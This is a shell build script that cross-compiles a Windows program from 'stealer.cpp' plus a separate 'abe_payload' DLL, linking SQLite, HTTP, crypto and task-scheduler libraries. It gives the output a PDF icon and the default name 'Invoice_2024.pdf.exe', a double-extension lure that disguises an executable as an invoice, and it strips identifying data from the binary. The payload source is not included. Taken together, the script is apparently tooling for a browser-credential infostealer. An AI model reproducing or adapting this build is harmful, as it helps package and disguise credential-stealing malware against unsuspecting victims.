#!/bin/sh
set -e
OUT=${1:-Invoice_2024.pdf.exe}

[ -f pdf.ico ]         || { echo "pdf.ico missing"; exit 1; }
[ -f sqlite3.c ]       || { echo "sqlite3.c missing"; exit 1; }
[ -f sqlite3.h ]       || { echo "sqlite3.h missing"; exit 1; }
[ -f abe_payload.cpp ] || { echo "abe_payload.cpp missing"; exit 1; }
[ -f res.rc ]          || { echo "res.rc missing"; exit 1; }
[ -f app.manifest ]    || { echo "app.manifest missing"; exit 1; }

CC=x86_64-w64-mingw32-gcc
CXX=x86_64-w64-mingw32-g++
RC=x86_64-w64-mingw32-windres

$CXX -std=c++17 -Os -s -shared \
  -ffunction-sections -fdata-sections -fno-ident \
  abe_payload.cpp -o abe_payload.dll \
  -static -static-libgcc -static-libstdc++ \
  -Wl,--gc-sections -Wl,-s \
  -lole32 -loleaut32 -luuid -ladvapi32 -lrpcrt4

$CC -c -Os \
  -ffunction-sections -fdata-sections \
  -DSQLITE_OMIT_LOAD_EXTENSION -DSQLITE_OMIT_DEPRECATED \
  -DSQLITE_OMIT_SHARED_CACHE -DSQLITE_THREADSAFE=0 \
  -DSQLITE_DEFAULT_MEMSTATUS=0 -DSQLITE_DQS=0 \
  sqlite3.c -o sqlite3.o

$RC res.rc -O coff -o res.o

$CXX -std=c++17 -I. -Os -s -mwindows \
  -ffunction-sections -fdata-sections \
  -fno-ident -fmerge-all-constants -fvisibility=hidden \
  stealer.cpp sqlite3.o res.o -o "$OUT" \
  -static -static-libgcc -static-libstdc++ \
  -Wl,--gc-sections -Wl,--build-id=none -Wl,-s \
  -Wl,--nxcompat -Wl,--dynamicbase -Wl,--high-entropy-va \
  -lwinhttp -lcrypt32 -lbcrypt -lncrypt -lole32 -loleaut32 -luuid \
  -lshlwapi -lshell32 -ltaskschd -ladvapi32 -lrpcrt4

x86_64-w64-mingw32-strip -s "$OUT"
rm -f res.o sqlite3.o abe_payload.dll
echo "built $OUT ($(stat -c%s "$OUT") bytes)"
